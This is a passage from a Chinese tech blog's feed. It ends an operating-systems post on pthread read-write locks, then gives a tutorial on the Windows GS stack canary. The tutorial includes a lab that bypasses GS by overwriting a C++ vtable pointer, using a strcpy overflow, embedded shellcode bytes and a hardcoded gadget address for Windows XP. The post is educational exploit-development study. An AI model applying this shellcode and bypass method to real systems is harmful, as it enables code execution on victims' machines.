class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;semaphore.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;time.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">pthread_rwlock_t</span> rwlock;</span><br><span class="line"><span class="type">int</span> num = <span class="number">-1</span>;<span class="comment">//共享内存</span></span><br><span class="line"><span class="type">void</span>* <span class="title function_">writer</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">pthread_rwlock_wrlock(&amp;rwlock);<span class="comment">//获取写模式的读写锁</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Writing [%d]&quot;</span>,(<span class="type">int</span>*)arg);</span><br><span class="line">num = (<span class="type">int</span>*)arg; <span class="comment">//向共享内存写入数据</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;----:%d\n&quot;</span>,num);</span><br><span class="line">pthread_rwlock_unlock(&amp;rwlock);</span><br><span class="line"></span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">reader</span><span class="params">(<span class="type">void</span>* arg)</span></span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">pthread_rwlock_rdlock(&amp;rwlock);<span class="comment">//获取读模式的读写锁</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;Reading [%d]----:%d\n&quot;</span>,(<span class="type">int</span>*)arg,num);<span class="comment">//读取共享内存</span></span><br><span class="line"></span><br><span class="line">pthread_rwlock_unlock(&amp;rwlock);</span><br><span class="line"></span><br><span class="line">pthread_exit(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">pthread_rwlock_init(&amp;rwlock,<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">pthread_t</span> pid1[<span class="number">5</span>],pid2[<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">pthread_create(&amp;pid1[i],<span class="literal">NULL</span>,reader,(<span class="type">void</span>*)i);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">pthread_create(&amp;pid2[i],<span class="literal">NULL</span>,writer,(<span class="type">void</span>*)i);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">5</span>; i++)</span><br><span class="line">pthread_join(pid1[i],<span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i &lt; <span class="number">2</span>; i++)</span><br><span class="line">pthread_join(pid2[i],<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">pthread_rwlock_destroy(&amp;rwlock);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510150139457.png" alt="未加锁"></p><p>加锁：<br><img src="/2022/05/10/%E7%BA%BF%E7%A8%8B%E7%9A%84%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/image-20220510150032813.png" alt="加锁"></p><h3 id="362-读写锁-同步互斥关键代码说明"><a class="markdownIt-Anchor" href="#362-读写锁-同步互斥关键代码说明"></a> 3.6.2 读写锁 同步互斥关键代码说明</h3><ol><li><p>int pthread_rwlock_init(pthread_rwlock_t *restrict rwlock, const pthread_rwlockattr_t *restrict attr);</p><blockquote><p>初始化读写锁</p></blockquote></li><li><p>int pthread_rwlock_destroy(pthread_rwlock_t *rwlock);</p><blockquote><p>销毁读写锁，释放其资源</p></blockquote></li><li><p>int pthread_rwlock_rdlock(pthread_rwlock_t *rwlock);</p><blockquote><p>获取读状态的读写锁，允许多个线程进行读访问</p></blockquote></li><li><p>int pthread_rwlock_wrlock(pthread_rwlock_t *rwlock);</p><blockquote><p>获取写状态的读写锁，只允许一个线程进行写访问</p></blockquote></li><li><p>int pthread_rwlock_unlock(pthread_rwlock_t *rwlock);</p><blockquote><p>解锁，不管是读状态还是写状态，都能用此函数进行解锁</p></blockquote></li></ol><h1 id="实验总结"><a class="markdownIt-Anchor" href="#实验总结"></a> 实验总结</h1><p>光看书不动手是学不到东西的，学中做，做中学。</p><h1 id="参考书籍"><a class="markdownIt-Anchor" href="#参考书籍"></a> 参考书籍</h1><blockquote><ol><li><p>亚伯拉罕·西尔伯沙茨 等 著，郑扣根 译。操作系统概念（原书第9版）。<br>机械工业出版社，ISBN：9787111604365，2018。</p></li><li><p>[美] W.，理查德·史蒂文斯（W.，Richard，Stevens）史蒂芬·A.，拉戈 著，<br>戚正伟，张亚英，尤晋元 译。Unix环境高级编程。<br>人民邮电出版社，ISBN：9787115516756，2019。</p></li></ol></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;操作系统同步互斥&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#操作系统同步互斥&quot;&gt;&lt;/a&gt; 《操作系统》同步互斥&lt;/h1&gt;
&lt;h1 id=&quot;引起同步互斥问题的原因&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=</summary>
      
    
    
    
    <category term="操作系统" scheme="https://www.rgzzplus.com/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="同步互斥" scheme="https://www.rgzzplus.com/tags/%E5%90%8C%E6%AD%A5%E4%BA%92%E6%96%A5/"/>
    
    <category term="互斥锁" scheme="https://www.rgzzplus.com/tags/%E4%BA%92%E6%96%A5%E9%94%81/"/>
    
    <category term="自旋锁" scheme="https://www.rgzzplus.com/tags/%E8%87%AA%E6%97%8B%E9%94%81/"/>
    
    <category term="读写锁" scheme="https://www.rgzzplus.com/tags/%E8%AF%BB%E5%86%99%E9%94%81/"/>
    
    <category term="信号量" scheme="https://www.rgzzplus.com/tags/%E4%BF%A1%E5%8F%B7%E9%87%8F/"/>
    
    <category term="条件变量" scheme="https://www.rgzzplus.com/tags/%E6%9D%A1%E4%BB%B6%E5%8F%98%E9%87%8F/"/>
    
    <category term="屏障" scheme="https://www.rgzzplus.com/tags/%E5%B1%8F%E9%9A%9C/"/>
    
  </entry>
  
  <entry>
    <title>栈中的守护天使：GS</title>
    <link href="https://www.rgzzplus.com/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/"/>
    <id>https://www.rgzzplus.com/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/</id>
    <published>2022-05-05T16:11:00.000Z</published>
    <updated>2022-05-05T16:13:21.954Z</updated>
    
    <content type="html"><![CDATA[<h1 id="gs-安全编译选项的保护原理"><a class="markdownIt-Anchor" href="#gs-安全编译选项的保护原理"></a> GS 安全编译选项的保护原理</h1><h2 id="实现版本"><a class="markdownIt-Anchor" href="#实现版本"></a> 实现版本</h2><p>针对缓冲区溢出时覆盖函数返回地址这一特征，微软在vs2003（vs 7.0）及以后的版本中，默认启用了 GS 编译选项。Project→project Properties→Configuration Properties→C/C++→Code Generation→Buffer Security Check  中设置GS。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503195855795.png" alt="image-20220503195855795"></p><h2 id="gs-是如何保护栈的呢"><a class="markdownIt-Anchor" href="#gs-是如何保护栈的呢"></a> GS 是如何保护栈的呢？</h2><p>GS 编译选项为每个函数调用增加了一些额外的数据和操作，用以检测栈中的溢出。</p><ul><li>在所有函数调用发生时，向栈帧内压入一个额外的随机 DWORD，这个随机数叫 &quot; canary &quot;。在IDA中反汇编，这个随机数会被标注为 “Security Cookie”。</li><li>Security Cookie 位于 EBP 之前，系统将在 .data 的内存空间中放一个 Security Cookie 的副本。</li><li>当栈发生溢出时，先淹没 Security Cookie ，然后才会淹没 EBP 和返回地址。</li><li>函数返回前，系统会先执行 Security check 来进行安全验证。</li><li>在 Security Cookie 的过程中，</li><li>系统将比较栈帧中原先存放的 Security Cookie 和.data 中副本的值，如果两者不吻合，说明栈帧中的 Security Cookie 已被破坏，即栈中发生了溢出</li></ul><p><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503205944714.png" alt="image-20220503205944714"></p><ul><li>当检测到栈中发生溢出时，系统将进入异常处理流程，函数不会被正常返回，ret 指令也不会被执行。</li></ul><p><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503210041230.png" alt="image-20220503210041230"></p><h2 id="在安全和性能间平衡的gs"><a class="markdownIt-Anchor" href="#在安全和性能间平衡的gs"></a> 在安全和性能间平衡的GS</h2><p>额外的数据和操作会使系统性能下降，为了降低对性能的影响，编译器在编译程序的时候并不是对所有的函数都应用 GS，以下情况<strong>不会应用 GS</strong>。</p><ul><li>函数不包含缓冲区。</li><li>函数被定义为具有变量参数列表。</li><li>函数使用无保护的关键字标记。</li><li>函数在第一个语句中包含内嵌汇编代码。</li><li>缓冲区不是 8 字节类型且大小不大于 4 个字节。</li></ul><h2 id="主动加gs的安全标志"><a class="markdownIt-Anchor" href="#主动加gs的安全标志"></a> 主动加GS的安全标志</h2><p>有例外就有机会，我们可以利用这些未被保护的函数来执行栈溢出。当然微软也发现了这个问题，在 Visual Studio 2005 SP1 起引入了一个新的安全标识：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">#pragma strict_gs_check </span><br></pre></td></tr></table></figure><p>这个标识能对任意的函数添加 Security Cookie。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">pragma</span> strict_gs_check(on) <span class="comment">// 为下边的函数强制启用 GS</span></span></span><br><span class="line">intvulfuction(<span class="type">char</span> * str)</span><br><span class="line">&#123;</span><br><span class="line">chararry[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(arry,str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line">int_tmain(intargc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* str=<span class="string">&quot;yeah,i have GS protection&quot;</span>;</span><br><span class="line">vulfuction(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="防覆盖的变量重排技术"><a class="markdownIt-Anchor" href="#防覆盖的变量重排技术"></a> 防覆盖的变量重排技术</h2><p>除了在返回地址前添加 Security Cookie 外，微软还使用了变量重排技术。在编译时，将字符串变量移动到栈帧的高地址，用以防止该字符串溢出时破坏其他的局部变量。同时还会将指针参数和字符串参数复制到内存中低地址，防止函数参数被破坏。</p><p><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503211230179.png" alt="image-20220503211230179"></p><h2 id="security-cookie-产生细节"><a class="markdownIt-Anchor" href="#security-cookie-产生细节"></a> Security Cookie 产生细节</h2><ul><li>系统以.data 节的第一个双字作为 Cookie 的种子，或称原始 Cookie（所有函数的 Cookie都用这个 DWORD 生成）。</li><li>在程序每次运行时 Cookie 的种子都不同，因此种子有很强的随机性</li><li>在栈桢初始化以后系统用 ESP 异或种子，作为当前函数的 Cookie，以此作为不同函数之间的区别，并增加 Cookie 的随机性</li><li>在函数返回前，用 ESP 还原出（异或） Cookie 的种子</li></ul><p>若想在程序运行时预测出 Cookie 而突破 GS 机制基本上是不可能的。</p><h2 id="微软内部对gs的看法"><a class="markdownIt-Anchor" href="#微软内部对gs的看法"></a> 微软内部对GS的看法</h2><ul><li>修改栈帧中函数返回地址的经典攻击将被 GS 机制有效遏制；</li><li>基于改写函数指针的攻击，如第 6 章中讲到的对 C++虚函数的攻击， GS 机制仍然很难防御；</li><li>针对异常处理机制的攻击， GS 很难防御；</li><li>GS 是对栈帧的保护机制，因此很难防御堆溢出的攻击。</li></ul><h2 id="本章实验环境配置"><a class="markdownIt-Anchor" href="#本章实验环境配置"></a> 本章实验环境配置</h2><p>为了更直观的反映出程序再内存中的状态，实验编译中<strong>禁用优化选项</strong>。</p><p><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220502194125429.png" alt="image-20220502194125429"></p><h1 id="利用未被保护的内存突破-gs"><a class="markdownIt-Anchor" href="#利用未被保护的内存突破-gs"></a> 利用未被保护的内存突破 GS</h1><p>函数 vulfuction 不包含4字节以上的缓冲区，所以即使 GS 处于开启状态，这个函数也不受GS保护。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="comment">//#pragma strict_gs_check(on) // 为下边的函数强制启用 GS</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">vulfuction</span><span class="params">(<span class="type">char</span> * str)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> arry[<span class="number">4</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(arry,str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="type">int</span> _tmain(<span class="type">int</span> argc, _TCHAR* argv[])</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span>* str=<span class="string">&quot;yeah,the fuction is without GS&quot;</span>;</span><br><span class="line">vulfuction(str);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>用 IDA 对可执行程序反汇编，vulfuction 返回前（<strong>指令 retn</strong>）没有 security cookie 验证操作。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503193601251.png" alt="image-20220503193601251"></p><p>对比，强制启用GS后，<code>#pragma strict_gs_check(on)</code>，retn 前对 Security Cookie 进行了验证。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503193845557.png" alt="image-20220503193845557"></p><h1 id="覆盖虚函数突破-gs"><a class="markdownIt-Anchor" href="#覆盖虚函数突破-gs"></a> 覆盖虚函数突破 GS</h1><h2 id="如何利用虚函数绕过-gs机制"><a class="markdownIt-Anchor" href="#如何利用虚函数绕过-gs机制"></a> 如何利用虚函数绕过 GS机制？</h2><p>**绕过GS机制思路：**程序只有返回时才会去检查 Security Cookie，所以只要在程序检查 Security Cookie 前劫持程序流程，就能对程序的溢出，而 C++ 虚函数恰好给我们提供了这样的一个机会。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// exp_2.cpp : Defines the entry point for the console application.</span></span><br><span class="line"><span class="comment">//</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;stdafx.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&quot;string.h&quot;</span></span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">GSVirtual</span> &#123;</span></span><br><span class="line">public :</span><br><span class="line"><span class="type">void</span> <span class="title function_">gsv</span><span class="params">(<span class="type">char</span> * src)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="type">char</span> buf[<span class="number">200</span>];</span><br><span class="line"><span class="built_in">strcpy</span>(buf, src);</span><br><span class="line"><span class="comment">//__asm int 3</span></span><br><span class="line">vir();</span><br><span class="line">&#125;</span><br><span class="line">virtual <span class="type">void</span> <span class="title function_">vir</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">&#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">GSVirtual test;</span><br><span class="line">test.gsv(</span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="string">&quot;\x90\x90\x90\x90\x90\x90\x90\0&quot;</span></span><br><span class="line">);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">&quot;\xf6\x2a\x99\x7C&quot; //address of &quot;pop pop ret&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFC\x68\x6A\x0A\x38\x1E\x68\x63\x89\xD1\x4F\x68\x32\x74\x91\x0C&quot;</span></span><br><span class="line"><span class="comment">&quot;\x8B\xF4\x8D\x7E\xF4\x33\xDB\xB7\x04\x2B\xE3\x66\xBB\x33\x32\x53&quot;</span></span><br><span class="line"><span class="comment">&quot;\x68\x75\x73\x65\x72\x54\x33\xD2\x64\x8B\x5A\x30\x8B\x4B\x0C\x8B&quot;</span></span><br><span class="line"><span class="comment">&quot;\x49\x1C\x8B\x09\x8B\x69\x08\xAD\x3D\x6A\x0A\x38\x1E\x75\x05\x95&quot;</span></span><br><span class="line"><span class="comment">&quot;\xFF\x57\xF8\x95\x60\x8B\x45\x3C\x8B\x4C\x05\x78\x03\xCD\x8B\x59&quot;</span></span><br><span class="line"><span class="comment">&quot;\x20\x03\xDD\x33\xFF\x47\x8B\x34\xBB\x03\xF5\x99\x0F\xBE\x06\x3A&quot;</span></span><br><span class="line"><span class="comment">&quot;\xC4\x74\x08\xC1\xCA\x07\x03\xD0\x46\xEB\xF1\x3B\x54\x24\x1C\x75&quot;</span></span><br><span class="line"><span class="comment">&quot;\xE4\x8B\x59\x24\x03\xDD\x66\x8B\x3C\x7B\x8B\x59\x1C\x03\xDD\x03&quot;</span></span><br><span class="line"><span class="comment">&quot;\x2C\xBB\x95\x5F\xAB\x57\x61\x3D\x6A\x0A\x38\x1E\x75\xA9\x33\xDB&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\x68\x77\x65\x73\x74\x68\x66\x61\x69\x6C\x8B\xC4\x53\x50\x50&quot;</span></span><br><span class="line"><span class="comment">&quot;\x53\xFF\x57\xFC\x53\xFF\x57\xF8\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">&quot;\x90\x90\x90\x90\x90\x90\x90\x90&quot;</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure><p>实验思路和代码简要解释：<br>（1）类 GSVirtual 中的 gsv 函数存在典型的溢出漏洞 strcpy 。<br>（2）类 GSVirtual 中包含一个虚函数 vir。<br>（3）当 gsv 函数中的 buf 变量发生溢出的时候有可能会影响到虚表指针，如果我们可以<strong>控制虚表指针</strong>，将其指向我们的可以控制的内存空间，就可以在程序调用虚函数时控制程序的流程。</p><table><thead><tr><th></th><th>推荐使用的环境</th><th>备 注</th></tr></thead><tbody><tr><td>操作系统</td><td>Window XP SP3</td><td></td></tr><tr><td>编译器</td><td>Visual Studio 2008</td><td></td></tr><tr><td>编译选项</td><td>禁用优化选项</td><td></td></tr><tr><td>build 版本</td><td>release 版本</td><td></td></tr></tbody></table><blockquote><p>说明：<br>shellcode 中头部的 0x7C992af6 为“pop edi pop esi retn”指令的地址，不同版本的系统中该地址可能不同，如果您在其他版本中进行实验，可能需要重新设置此地址。</p></blockquote><p>为了能够精准地淹没虚函数表，我们需要搞清楚变量buff与虚表指针在内存中的详细布局。</p><h2 id="变量与虚表指针在内存中的布局"><a class="markdownIt-Anchor" href="#变量与虚表指针在内存中的布局"></a> 变量与虚表指针在内存中的布局</h2><p>当函数 gsv 传入参数的长度大于 200 个字节时，变量 buff 就会被溢出。先将 test.gsv 中传入参数修改为 199 个“\x90” +1 个“\0”，然后用 OllyDbg 加载程序，在执行完 strcpy 后暂停。<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503215213232.png" alt="image-20220503215213232"></p><blockquote><p>红色框：虚函数表地址</p><p>紫色框：<br>0012ff68Security Cookie<br>0012ff6CEBP<br>0012ff70返回地址<br>0012ff74参数</p><p>黑色框：函数gsv中变量等其它信息</p></blockquote><p>从图中可以看出，buf 变量末尾的 ”\0“ 在<code>0012ff64</code>位置，而虚表指针在 <code>0012ff78</code>位置，相距 20个字节。</p><h2 id="淹没虚表指针后如何控制程序的流程"><a class="markdownIt-Anchor" href="#淹没虚表指针后如何控制程序的流程"></a> 淹没虚表指针后如何控制程序的流程？</h2><p>虚函数的调用过程：程序根据<strong>虚表指针</strong>找到虚表，然后从虚表中取出要调用的<strong>虚函数的地址</strong>，根据这个地址转入虚函数执行。</p><p><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503221539056.png" alt="image-20220503221539056"></p><p>我们需要做的就是<strong>将虚表指针指向我们的 shellcode</strong>，以劫持进程，为此还有几个关键问题需要解决。</p><h2 id="关键问题"><a class="markdownIt-Anchor" href="#关键问题"></a> 关键问题</h2><h3 id="如何让虚表指针刚好指向-shellcode-的范围"><a class="markdownIt-Anchor" href="#如何让虚表指针刚好指向-shellcode-的范围"></a> 如何让虚表指针刚好指向 shellcode 的范围？</h3><p>变量 buff 在内存中的位置不固定，但是原始参数（0x00402100 即作为调用参数的shellcode）是位于虚表（0x004021D0）附近，所以我们可以通过<strong>覆盖部分虚表指针</strong>的方法，<strong>让虚表指针指向原始参数</strong>，在本实验中使用字符串结束符 “\0” 覆盖虚表指针的最低位即可让其指向原始参数的最前端。（由于虚函数列表指针为D0，shellcode参数的地址为00，故而覆盖虚函数最后一个字节即可）</p><h3 id="执行完call-eax后如何返回-shellcode"><a class="markdownIt-Anchor" href="#执行完call-eax后如何返回-shellcode"></a> 执行完call eax后如何返回 shellcode ？</h3><p>虚表指针指向原始参数中的 shellcode 后，我们面临着一个 call 操作，在执行完这个 call 后还必须可以返回 shellcode 内存空间继续执行。您可能首先会想到 jmp esp 跳板指令，但是很不幸，这个指令在这行不通，如下图所示<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503222910402.png" alt="image-20220503222910402"></p><p>我们的原始参数不在栈中！无法跳回 0x00402100 的内存空间继续执行了。此时程序已经完成 strcpy()字符串复制，shellcode 已经被复制到变量 Buff 中了，所以我们可以转入 Buff 的内存空间继续执行 shellcode。Buff的地址放在 0x0012FE8C 中，位于ESP+4位置，由于call eax 操作后会将返回地址入栈，所以我们需要“pop pop retn”（位于内存 0x7C992af6 处）指令作为跳板，才能进入 Buff 中（0012FE9C）执行 shellcode。</p><p><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503232435038.png" alt="image-20220503232435038"></p><p>shellcode结构：<br><img src="/2022/05/06/%E6%A0%88%E4%B8%AD%E7%9A%84%E5%AE%88%E6%8A%A4%E5%A4%A9%E4%BD%BF%EF%BC%9AGS/image-20220503231840205.png" alt="image-20220503231840205"></p><p>将构建好的shellcode重新填充到程序中，运行结果如下图所示。<br><img 